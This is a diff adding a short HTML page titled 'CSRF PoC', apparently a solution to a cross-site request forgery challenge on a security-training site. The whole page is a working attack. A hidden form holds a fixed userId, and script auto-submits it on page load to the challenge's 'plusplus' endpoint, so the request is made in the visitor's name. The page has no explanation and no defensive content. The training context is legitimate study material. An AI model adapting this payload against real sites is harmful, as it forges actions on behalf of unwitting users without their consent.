@@ -1,0 +1,13 @@
+<HTML>
+<HEAD>
+<TITLE>CSRF PoC</TITLE>
+</HEAD>
+<H1>CSRF PoC</H1>
+
+<form name="evilForm" action="https://shepherd.cybercops.fr/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="f2ba77abe78f629fc1b31aaa4ea45abf205bd01f" />
+    <input type="submit"/>
+</form>
+<script> document.evilForm.submit(); </script>
+</BODY>
+</HTML>
